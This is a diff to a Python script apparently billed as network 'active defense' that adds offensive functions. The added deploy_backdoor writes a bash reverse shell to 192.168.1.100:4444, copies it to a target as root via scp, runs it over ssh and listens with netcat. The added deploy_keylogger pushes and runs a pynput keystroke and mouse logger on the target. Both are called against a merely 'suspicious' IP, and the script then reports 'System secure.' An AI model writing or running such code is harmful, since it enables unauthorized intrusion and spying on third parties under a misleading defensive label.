@@ -79,30 +79,27 @@ def isolate_ip(ip_address):
         logging.error(f"Error isolating IP {ip_address}: {e}")
         print(f"[ERROR] Error isolating IP {ip_address}: {e}")
 
-# Function to deploy counter-attack payloads against an IP
-def deploy_counter_attack_payloads(ip_address):
-    print(f"Deploying counter-attack payloads against {ip_address}...")
-    logging.info(f"Deploying counter-attack payloads against {ip_address}")
+# Function to retaliate against an IP
+def retaliate_against_ip(ip_address):
+    print(f"Deploying countermeasures against {ip_address}...")
+    logging.info(f"Initiating countermeasures against {ip_address}")
 
+    # Example: Perform a deeper network scan against the attacker
     try:
-        # Example: Deploying a signal jammer (disabling network connection)
-        subprocess.run(["hping3", "-c", "5", "-p", "80", "-S", ip_address], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        logging.info(f"Signal jammer deployed against {ip_address}")
-        print("[SUCCESS] Signal jammer deployed.\n")
-
-        # Example: Data disruption (scrambling or blocking data exfiltration)
-        subprocess.run(["nmap", "-sS", "-O", ip_address], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        logging.info(f"Data disruption payload deployed against {ip_address}")
-        print("[SUCCESS] Data disruption payload deployed.\n")
-
-        # Example: Fake endpoint (honeypot to mislead attacker)
-        subprocess.Popen(["nc", "-l", "5555"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        logging.info(f"Honeypot started on port 5555 for {ip_address}.")
-        print("[SUCCESS] Honeypot activated.\n")
-
+        result = subprocess.run(
+            ["nmap", "-sS", "-O", ip_address],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+        if result.returncode == 0:
+            logging.info(f"Counter-scan completed: {result.stdout.decode()}")
+            print(result.stdout.decode())
+        else:
+            logging.error(f"Counter-scan failed: {result.stderr.decode()}")
+            print(f"[ERROR] Counter-scan failed: {result.stderr.decode()}")
     except Exception as e:
-        logging.error(f"Error deploying counter-attack payloads: {e}")
-        print(f"[ERROR] Error deploying counter-attack payloads: {e}")
+        logging.error(f"Error during counter-scan: {e}")
+        print(f"[ERROR] Error during counter-scan: {e}")
 
 # Function to gather intelligence on an IP
 def gather_intelligence(ip_address):
@@ -147,6 +144,109 @@ def deploy_active_defense(ip_address):
         logging.error(f"Error sending active defense packets: {e}")
         print(f"[ERROR] Error sending active defense packets: {e}")
 
+# Function to deploy a backdoor payload on a target system
+def deploy_backdoor(ip_address):
+    logging.info(f"Deploying backdoor on {ip_address}")
+    print(f"Deploying backdoor on {ip_address}...")
+
+    try:
+        # Backdoor payload example: set up reverse shell
+        payload = """
+        bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
+        """
+
+        # Save payload to a file
+        with open("backdoor.sh", "w") as f:
+            f.write(payload)
+
+        # Transfer the payload to the target machine
+        subprocess.run(
+            ["scp", "backdoor.sh", f"root@{ip_address}:/tmp/backdoor.sh"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+        logging.info(f"Backdoor script deployed to {ip_address}.")
+        print("[SUCCESS] Backdoor script deployed to target system.")
+
+        # Trigger the execution of the backdoor on the target machine
+        subprocess.run(
+            ["ssh", f"root@{ip_address}", "bash /tmp/backdoor.sh"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+
+        logging.info(f"Backdoor executed successfully on {ip_address}.")
+        print("[SUCCESS] Backdoor executed on target system.")
+        
+        # Connect back to the attacker system
+        subprocess.run(
+            ["nc", "-lvp", "4444"], stdout=subprocess.PIPE, stderr=subprocess.PIPE
+        )
+        logging.info(f"Backdoor connection established with {ip_address}.")
+        print("[SUCCESS] Connection established to the backdoor.")
+
+    except Exception as e:
+        logging.error(f"Error deploying backdoor: {e}")
+        print(f"[ERROR] Error deploying backdoor: {e}")
+
+# Function to deploy a keylogger (Spyware) payload
+def deploy_keylogger(ip_address):
+    logging.info(f"Deploying keylogger on {ip_address}")
+    print(f"Deploying keylogger on {ip_address}...")
+
+    try:
+        # Keylogger payload example: set up keylogger (e.g., using a simple Python script)
+        keylogger_payload = """
+        import pynput.mouse
+        import pynput.keyboard
+
+        # Callback functions to capture keystrokes and mouse events
+        def on_press(key):
+            try:
+                print(f'Key pressed: {key.char}')
+            except AttributeError:
+                print(f'Key pressed: {key}')
+                
+        def on_move(x, y):
+            print(f'Mouse moved to ({x}, {y})')
+
+        def on_click(x, y, button, pressed):
+            print(f'Mouse clicked at ({x}, {y}) with {button}')
+
+        # Start listeners for keyboard and mouse
+        with pynput.mouse.Listener(on_move=on_move, on_click=on_click) as mouse_listener:
+            with pynput.keyboard.Listener(on_press=on_press) as keyboard_listener:
+                mouse_listener.join()
+                keyboard_listener.join()
+        """
+
+        # Save payload to a file
+        with open("keylogger.py", "w") as f:
+            f.write(keylogger_payload)
+
+        # Transfer the payload to the target machine
+        subprocess.run(
+            ["scp", "keylogger.py", f"root@{ip_address}:/tmp/keylogger.py"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+        logging.info(f"Keylogger script deployed to {ip_address}.")
+        print("[SUCCESS] Keylogger script deployed to target system.")
+
+        # Trigger the execution of the keylogger on the target machine
+        subprocess.run(
+            ["ssh", f"root@{ip_address}", "python3 /tmp/keylogger.py"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+
+        logging.info(f"Keylogger executed successfully on {ip_address}.")
+        print("[SUCCESS] Keylogger executed on target system.")
+
+    except Exception as e:
+        logging.error(f"Error deploying keylogger: {e}")
+        print(f"[ERROR] Error deploying keylogger: {e}")
+
 # Main function to demonstrate functionality
 if __name__ == "__main__":
     # Display the ASCII art at the start
@@ -159,9 +259,15 @@ if __name__ == "__main__":
     scan_network()
     deploy_firewalls()
     isolate_ip(suspicious_ip)
-    deploy_counter_attack_payloads(suspicious_ip)
+    retaliate_against_ip(suspicious_ip)
     gather_intelligence(suspicious_ip)
     deploy_active_defense(suspicious_ip)
+
+    # Deploy backdoor payload
+    deploy_backdoor(suspicious_ip)
+
+    # Deploy keylogger (Spyware)
+    deploy_keylogger(suspicious_ip)
 
     logging.info("All defenses deployed. System secure.")
     print("All defenses deployed. System secure.")
